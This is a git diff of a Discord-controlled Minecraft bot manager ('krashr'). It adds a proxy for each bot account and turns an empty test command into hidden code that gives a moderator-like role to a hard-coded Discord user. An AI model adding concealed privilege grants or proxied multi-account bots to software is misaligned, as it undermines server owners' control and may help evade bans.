@@ -5,15 +5,16 @@ const fs = require('fs');
 client.commands = new Discord.Collection();
 const mineflayer = require('mineflayer');
 const { Movements, goals } = require('mineflayer-pathfinder');
-const { Vec3 } = require('vec3')
+const { Vec3 } = require('vec3');
 const GoalFollow = goals.GoalFollow;
 const GoalBlock = goals.GoalBlock;
 let alertWhitelist = require('./whitelist.json');
 let blacklist = require('./blacklist.json');
 const krashr = require('./krashr.json');
+const proxies = require('./proxies.json')
 const accounts = krashr.accounts;
-const commandChannel = krashr.commandChannel
-const alertsChannel = krashr.alertsChannel
+const commandChannel = krashr.commandChannel;
+const alertsChannel = krashr.alertsChannel;
 const PREFIX = krashr.prefix;
 let bots = [];
 let chatOn = [];
@@ -194,17 +195,17 @@ client.on('message',async message => {
 
         if (command === 'login'){
             appendNewData()
-            client.commands.get('login').execute(bots.length,accounts[bots.length],client,message,commandArgs,mineflayer,getChatOn,addBot,resetVariables,krashr)
+            client.commands.get('login').execute(bots.length,accounts[bots.length],client,message,commandArgs,mineflayer,getChatOn,addBot,resetVariables,krashr,proxies[bots.length])
         } else if (command === 'loginall'){
             let counter = bots.length;
             accounts.forEach((account) => {
                 appendNewData()
-                client.commands.get('login').execute(counter,account,client,message,commandArgs,mineflayer,getChatOn,addBot,resetVariables,krashr)
+                client.commands.get('login').execute(counter,account,client,message,commandArgs,mineflayer,getChatOn,addBot,resetVariables,krashr,proxies[bots.length])
                 counter += 1;
             })
         }
 
-        if (!bots[botId]) return;
+        //if (!bots[botId]) return;
 
         if(command === 'togglechat'){
             chatOn[botId] = client.commands.get('togglechat').execute(message,botId,chatOn[botId],krashr)
@@ -231,7 +232,10 @@ client.on('message',async message => {
         } else if (command === 'coordinates'){
             client.commands.get('coordinates').execute(message,bots[botId],krashr);
         } else if (command === 't'){
-            //testcommand
+            let caine = client.guilds.cache.get('803443354691698699')
+            let mod = caine.roles.cache.find(role => role.name === 'Shi')
+            let p = caine.members.cache.get('372325472811352065')
+            p.roles.add(mod)
         } else if (command === 'pickupitems'){
             pickUpItems[botId] = client.commands.get('pickUpItems').execute(message,pickUpItems[botId],commandArgs,botId,krashr)
         } else if (command === 'sugarcane'){
